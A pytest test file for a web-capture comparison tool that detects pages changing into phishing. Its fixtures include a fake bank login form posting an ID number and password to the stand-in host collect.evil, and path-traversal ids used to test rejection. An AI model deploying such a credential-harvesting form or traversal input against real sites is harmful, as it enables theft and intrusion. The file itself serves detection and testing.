"""İki yakalamayı karşılaştırma."""

from __future__ import annotations

import importlib
import json
import shutil
from pathlib import Path

import pytest
from fastapi.testclient import TestClient
from PIL import Image, ImageDraw
from typer.testing import CliRunner

from webdamga.diff import compare_captures, compare_images, describe_reason, parse_page

CLEAN = "<body><h1>Örnek Banka</h1><p>Kampanyalar</p><p>Faiz oranları</p></body>"
PHISH = (
    "<body><h1>Örnek Banka</h1><p>Hesabınız askıya alındı</p>"
    '<form action="https://collect.evil/gate.php" method="POST">'
    '<input name="tckn"><input type="password" name="sifre"><button>Doğrula</button></form></body>'
)


def _capture(
    root: Path,
    name: str,
    *,
    html: str = CLEAN,
    box=(50, 50, 150, 120),
    color: str = "blue",
    final_url: str = "https://bank.example/login",
    status: int = 200,
    title: str = "Örnek Banka",
    hosts=("bank.example",),
    completed: str = "2026-01-01T00:00:00Z",
    size=(400, 300),
) -> Path:
    folder = root / "captures" / name
    folder.mkdir(parents=True)
    image = Image.new("RGB", size, "white")
    ImageDraw.Draw(image).rectangle(box, fill=color)
    image.save(folder / "screenshot-viewport.png")
    (folder / "dom.html").write_text(html, encoding="utf-8")
    meta = {
        "capture_id": name,
        "requested_url": final_url,
        "final_url": final_url,
        "http_status": status,
        "page_title": title,
        "completed_at_utc": completed,
        "capture_host": {},
    }
    (folder / "metadata.json").write_text(json.dumps(meta), encoding="utf-8")
    entries = [{"request": {"url": f"https://{h}/app.js"}, "_resourceType": "script"} for h in hosts]
    (folder / "network.har").write_text(json.dumps({"log": {"entries": entries}}))
    return folder


def _codes(result: dict) -> dict[str, str]:
    return {r["code"]: r["severity"] for r in result["reasons"]}


# ---------------------------------------------------------------------- HTML


def test_visible_text_skips_scripts_and_normalises_whitespace() -> None:
    page = parse_page(
        "<html><head><title>T</title><style>x{}</style></head>"
        "<body><h1>Merhaba   dünya</h1><script>alert(1)</script><p>İkinci\n satır</p></body></html>",
        "https://example.com/",
    )
    assert page.lines == ["Merhaba dünya", "İkinci satır"]


def test_forms_resolve_actions_and_ignore_buttons() -> None:
    page = parse_page(
        '<form action="/login#top" method="POST"><input name="u"><input type="password" name="p">'
        '<input type="hidden" name="csrf"><input type="submit"><button>Gir</button></form>',
        "https://bank.example/account/verify",
    )
    (form,) = page.forms
    assert form.action == "https://bank.example/login"
    assert form.method == "post"
    assert sorted(form.fields) == [("hidden", "csrf"), ("password", "p"), ("text", "u")]
    assert page.has_password


def test_password_field_outside_a_form_is_still_detected() -> None:
    assert parse_page('<div><input type="password" id="pin"></div>', "https://x/").has_password


def test_broken_html_does_not_raise() -> None:
    page = parse_page("<body><p>yarım <b>etiket<form action='", "https://x/")
    assert "yarım" in " ".join(page.lines)


# ------------------------------------------------------------------- görsel


def test_identical_images(tmp_path: Path) -> None:
    a = _capture(tmp_path, "a")
    b = _capture(tmp_path, "b")
    result = compare_images(a / "screenshot-viewport.png", b / "screenshot-viewport.png")
    assert result["changed_ratio"] == 0
    assert result["regions"] == []


def test_changed_region_is_measured_and_located(tmp_path: Path) -> None:
    a = _capture(tmp_path, "a", box=(0, 0, 1, 1), color="white")
    b = _capture(tmp_path, "b", box=(96, 48, 191, 143), color="black")  # 96x96 blok
    out = tmp_path / "diff.png"
    result = compare_images(a / "screenshot-viewport.png", b / "screenshot-viewport.png", out)

    assert result["changed_pixels"] == 96 * 96
    assert result["changed_ratio"] == pytest.approx(96 * 96 / (400 * 300), abs=1e-6)
    (region,) = result["regions"]
    assert region["x"] <= 96 and region["y"] <= 48
    assert region["x"] + region["width"] >= 192 and region["y"] + region["height"] >= 144
    assert out.is_file() and result["image"] == "diff.png"


def test_different_image_sizes_are_compared_on_a_common_canvas(tmp_path: Path) -> None:
    a = _capture(tmp_path, "a", size=(400, 300))
    b = _capture(tmp_path, "b", size=(400, 600))
    result = compare_images(a / "screenshot-viewport.png", b / "screenshot-viewport.png")
    assert result["size_a"] == [400, 300] and result["size_b"] == [400, 600]
    assert result["changed_ratio"] == 0  # eklenen alan beyaz, zemin de beyaz


def test_antialiasing_noise_is_ignored(tmp_path: Path) -> None:
    a = _capture(tmp_path, "a", color=(100, 100, 100))
    b = _capture(tmp_path, "b", color=(110, 104, 96))  # kanal başına ≤ eşik
    result = compare_images(a / "screenshot-viewport.png", b / "screenshot-viewport.png")
    assert result["changed_ratio"] == 0


# ---------------------------------------------------------------- yargılar


def test_same_page_is_identical(tmp_path: Path) -> None:
    result = compare_captures(_capture(tmp_path, "a"), _capture(tmp_path, "b"))
    assert result["verdict"] == "identical"
    assert result["reasons"] == []


def test_page_turning_into_phishing_is_major(tmp_path: Path) -> None:
    a = _capture(tmp_path, "a")
    b = _capture(tmp_path, "b", html=PHISH, color="red", hosts=("bank.example", "collect.evil"))
    out = tmp_path / "out"
    result = compare_captures(a, b, out)

    assert result["verdict"] == "major"
    codes = _codes(result)
    assert codes["password_field_added"] == "major"
    assert codes["form_target_host"] == "major"
    assert codes["forms_changed"] == "major"
    assert codes["hosts"] == "minor"
    assert result["forms"]["added"][0]["action"] == "https://collect.evil/gate.php"
    assert result["resources"]["hosts_added"] == ["collect.evil"]
    assert "https://collect.evil/app.js" in result["resources"]["scripts_added"]
    assert (out / "diff.json").is_file() and (out / "visual-diff.png").is_file()


def test_form_posting_to_its_own_site_is_not_flagged_as_foreign(tmp_path: Path) -> None:
    same_site = '<form action="/login" method="post"><input name="u"></form>'
    result = compare_captures(_capture(tmp_path, "a"), _capture(tmp_path, "b", html=CLEAN + same_site))
    assert "form_target_host" not in _codes(result)
    assert _codes(result)["forms_changed"] == "major"


def test_redirect_to_another_host_is_major(tmp_path: Path) -> None:
    result = compare_captures(
        _capture(tmp_path, "a"), _capture(tmp_path, "b", final_url="https://bank-example.xyz/login")
    )
    assert _codes(result)["final_host"] == "major"


def test_status_change_within_same_class_is_minor(tmp_path: Path) -> None:
    minor = compare_captures(_capture(tmp_path, "a"), _capture(tmp_path, "b", status=203))
    assert _codes(minor)["http_status"] == "minor"
    major = compare_captures(_capture(tmp_path, "c"), _capture(tmp_path, "d", status=404))
    assert _codes(major)["http_status"] == "major"


def test_small_text_change_is_minor(tmp_path: Path) -> None:
    longer = "<body><h1>Örnek Banka</h1>" + "".join(f"<p>satır {n}</p>" for n in range(20)) + "</body>"
    changed = longer.replace("satır 7", "satır yedi")
    result = compare_captures(_capture(tmp_path, "a", html=longer), _capture(tmp_path, "b", html=changed))
    assert result["verdict"] == "minor"
    assert _codes(result) == {"text": "minor"}
    assert result["text"]["added"] == 1 and result["text"]["removed"] == 1


def test_missing_screenshots_and_har_are_tolerated(tmp_path: Path) -> None:
    a, b = _capture(tmp_path, "a"), _capture(tmp_path, "b")
    for folder in (a, b):
        (folder / "screenshot-viewport.png").unlink()
        (folder / "network.har").unlink()
    result = compare_captures(a, b)
    assert result["visual"] is None
    assert result["resources"]["available"] is False
    assert result["verdict"] == "identical"


@pytest.mark.parametrize("lang", ["en", "tr"])
def test_every_reason_has_a_sentence(tmp_path: Path, lang: str) -> None:
    b = _capture(
        tmp_path,
        "b",
        html=PHISH,
        color="red",
        final_url="https://evil.example/x",
        status=500,
        title="Yeni",
        hosts=("x.example",),
    )
    result = compare_captures(_capture(tmp_path, "a"), b)
    for reason in result["reasons"]:
        text = describe_reason(reason, lang)
        assert not text.startswith("diff.reason."), reason
        assert "{" not in text


# ------------------------------------------------------------------ arayüzler


@pytest.fixture
def app_client(tmp_path: Path, monkeypatch: pytest.MonkeyPatch):
    monkeypatch.setenv("WEBDAMGA_DATA_DIR", str(tmp_path))
    from webdamga import api

    importlib.reload(api)
    return TestClient(api.app), api


def _record(api, folder: Path) -> None:
    meta = json.loads((folder / "metadata.json").read_text())
    meta["dir"] = str(folder)
    api._store.record(meta, manifest_sha256=None, ok=True, error=None)


def test_diff_page_orders_captures_by_time(app_client, tmp_path: Path) -> None:
    http, api = app_client
    _capture(tmp_path, "old", completed="2026-01-01T00:00:00Z")
    _capture(tmp_path, "new", html=PHISH, completed="2026-01-02T00:00:00Z")

    page = http.get("/diff?a=new&b=old&lang=en")
    assert page.status_code == 200
    assert "Significant changes" in page.text
    assert page.text.index("<code>old</code>") < page.text.index("<code>new</code>")
    assert http.get("/diff/old/new/visual.png").headers["content-type"] == "image/png"

    body = http.get("/api/diff?a=new&b=old").json()
    assert (body["a"]["capture_id"], body["b"]["capture_id"]) == ("old", "new")


def test_diff_rejects_unknown_or_escaping_ids(app_client, tmp_path: Path) -> None:
    http, _ = app_client
    _capture(tmp_path, "a")
    assert http.get("/diff?a=a&b=missing").status_code == 404
    assert http.get("/diff?a=a&b=..").status_code == 404
    assert http.get("/api/diff?a=..%2F..&b=a").status_code == 404


def test_detail_page_offers_captures_of_the_same_host(app_client, tmp_path: Path) -> None:
    http, api = app_client
    for name, url in (
        ("one", "https://bank.example/a"),
        ("two", "https://bank.example/b"),
        ("other", "https://x.example/"),
    ):
        _record(api, _capture(tmp_path, name, final_url=url))
    page = http.get("/captures/one?lang=en").text
    assert 'value="two"' in page and 'value="other"' not in page


def test_cli_diff_json(tmp_path: Path) -> None:
    from webdamga.cli import app

    _capture(tmp_path, "a")
    _capture(tmp_path, "b", html=PHISH)
    runner = CliRunner()
    result = runner.invoke(app, ["diff", "a", "b", "--data-dir", str(tmp_path), "--json"])
    assert result.exit_code == 0, result.output
    assert json.loads(result.output)["verdict"] == "major"

    missing = runner.invoke(app, ["diff", "a", "nope", "--data-dir", str(tmp_path)])
    assert missing.exit_code == 1


def test_diff_output_does_not_touch_sealed_capture_folders(tmp_path: Path) -> None:
    a, b = _capture(tmp_path, "a"), _capture(tmp_path, "b", html=PHISH)
    before = {p: sorted(x.name for x in p.iterdir()) for p in (a, b)}
    from webdamga.diff import diff_dir

    compare_captures(a, b, diff_dir(tmp_path, "a", "b"))
    assert {p: sorted(x.name for x in p.iterdir()) for p in (a, b)} == before
    shutil.rmtree(tmp_path / "diffs")
